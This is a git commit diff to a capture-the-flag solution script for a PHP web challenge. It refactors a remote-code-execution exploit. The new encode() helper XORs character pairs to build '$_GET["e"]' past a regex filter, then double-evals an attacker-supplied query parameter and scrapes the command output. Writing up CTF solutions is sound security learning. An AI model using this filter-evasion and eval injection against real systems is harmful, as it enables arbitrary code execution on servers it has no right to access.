2016c84aeeee408fc7a5198db99182d2c55163fc
David Nemeth Csoka <encse@csokavar.hu>
2021-04-28 08:09:36 +0200

    x

--- secchallenge/web/until-the-end/solution/solve.py
+++ secchallenge/web/until-the-end/solution/solve.py
@@ -36,21 +36,17 @@ def rce(cmd):
     # we will exploit the second 'if' case. Let's introduce a new query parameter 'e' which will be
     # executed by our exploit.
     #
-    # First build up the string '$_GET["e"]' with the use of string interpolation and XOR operations
-    # to trick the regexp filter.
-
-    # Note that 'a'^'$' is just 'E' and '|'^'(' is a funny way to write 'T':
-    exploit = '''
-        $a='$_G';
-        $aa='a'^'$';
-        $aaa='|'^'(';
-        $aaaa='["e"]';
-        $aaaaa="$a$aa$aaa$aaaa";
-    '''
-
-    # $aaaaa equals to '$_GET["e"]' now. If we eval it, we get the 'e' query parameter, the second eval in turn runs e as PHP code:
-    exploit += f'''
-        eval("eval($aaaaa);");
+    # First build up the string '$_GET["e"]' with XOR operations to trick the regexp filter.
+    # $a equals to '$_GET["e"]'.
+    # If we eval it, we get the 'e' query parameter, the second eval in turn runs e as PHP code:
+    enc1, enc2 = encode('$_GET["e"]')
+    # exploit = f'''
+    #     $a='P#{y/t|@|<' ^ 't|<<{/^%^a';
+    #     eval("eval($a);");
+    # '''
+    exploit = f'''
+        $a='{enc1}'^'{enc2}';
+        eval("eval($a);");
     '''
 
     exploit = urllib.parse.quote(exploit)
@@ -60,6 +56,20 @@ def rce(cmd):
     response = requests.get(f'{base_url}?e={cmd}&%2b={exploit}')
     return re.search(r'qqqqq(.*)qqqqq', response.text, re.DOTALL).group(1)
 
+def encode(st):
+    rx = r'[\'b-d\-0-9H-LA-DU-Xi-kn-s!?TEz.]'
+    res1 = ''
+    res2 = ''
+
+    for ch in st:
+        for i in range(32, 127):
+            x = ord(ch) ^ i
+            if 32 <= x < 127 and not re.match(rx, chr(x)) and not re.match(rx, chr(i)):
+                res1 += chr(x)
+                res2 += chr(i)
+                break
+
+    return res1, res2
 
 if __name__ == "__main__":
     print(solve())
